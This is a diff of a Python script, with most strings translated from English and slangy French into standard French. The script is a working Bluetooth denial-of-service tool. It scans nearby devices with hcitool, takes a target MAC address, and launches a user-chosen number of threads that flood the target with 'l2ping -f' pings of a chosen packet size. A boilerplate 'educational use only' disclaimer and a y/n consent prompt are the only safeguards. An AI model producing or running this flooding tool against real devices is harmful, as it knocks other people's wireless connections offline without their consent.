@@ -7,37 +7,37 @@ def DOS(target_addr, packages_size):
     os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')
 
 def main():
-    print('Bluetooth DOS attack(bravo tu va empecher un mec de se connexion en bluetooth(peu utiles)\n')
+    print('Bluetooth DOS attack (vous allez empêcher une connexion Bluetooth, peu utile)\n')
     time.sleep(0.1)
-    print('\x1bThis tool is provided for educational and legal penetration testing purposes only. The developers assume no responsibility for any misuse or damage caused by the use of this program. It is the sole responsibility of the end-user to ensure that their actions comply with applicable laws and ethical standards. By using this software, you agree to use it responsibly and accept all associated risks.
-)
-    if input("ACCEPTEZ VOUS LES CONDITIONS ?/DO U AGREE ? (y/n) > ").lower() == 'y':
+    print('Ce script est fourni à des fins éducatives et légales de tests de pénétration uniquement. Les développeurs n'assument aucune responsabilité pour tout abus ou dommage causé par l'utilisation de ce programme. Il incombe uniquement à l'utilisateur final de s'assurer que ses actions sont conformes aux lois applicables et aux normes éthiques. En utilisant ce logiciel, vous acceptez de l'utiliser de manière responsable et d'accepter tous les risques associés.\n')
+
+    if input("Acceptez-vous les conditions ? (y/n) > ").lower() == 'y':
         os.system('clear')
         print('Bluetooth DOS Script\n')
-        print("jte cherche ...")
+        print("Recherche en cours ...")
         output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
         lines = output.splitlines()[1:]
         array = [line.split()[0] for line in lines]
-        print("|id   |   mac_addres  |   device_name|")
+        print("| id  |   Mac Address   |   Device Name  |")
         for i, line in enumerate(lines):
-            print(f"|{i}   |   {line.split()[0]}  |   {''.join(line.split()[1:])}|")
-        target_id = input('Target id or mac/adresse mac > ')
+            print(f"| {i}   |   {line.split()[0]}   |   {''.join(line.split()[1:])} |")
+        target_id = input('ID cible ou adresse Mac > ')
         target_addr = array[int(target_id)] if target_id.isdigit() else target_id
-        packages_size = int(input('Packages size > '))
-        threads_count = int(input('Threads count > '))
+        packages_size = int(input('Taille des paquets > '))
+        threads_count = int(input('Nombre de threads > '))
         os.system('clear')
-        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+        print("\x1b[31m[*] Démarrage de l'attaque DOS dans 3 secondes...")
         for i in range(3, 0, -1):
             print(f'[*] {i}')
             time.sleep(1)
         os.system('clear')
-        print('[*] Building...\n')
+        print('[*] Construction...\n')
         for _ in range(threads_count):
             threading.Thread(target=DOS, args=[target_addr, packages_size]).start()
-        print('[*] Built..')
-        print('[*] Starting...')
+        print('[*] Construit..')
+        print('[*] Démarrage...')
     else:
-        print('trip trip')
+        print('Abandon...')
         exit(0)
 
 if __name__ == '__main__':
@@ -45,6 +45,6 @@ if __name__ == '__main__':
         os.system('clear')
         main()
     except KeyboardInterrupt:
-        print('\n[*] Aborted')
+        print('\n[*] Abandonné')
     except Exception as e:
-        print('[!] ERROR:', e)
+        print('[!] ERREUR:', e)
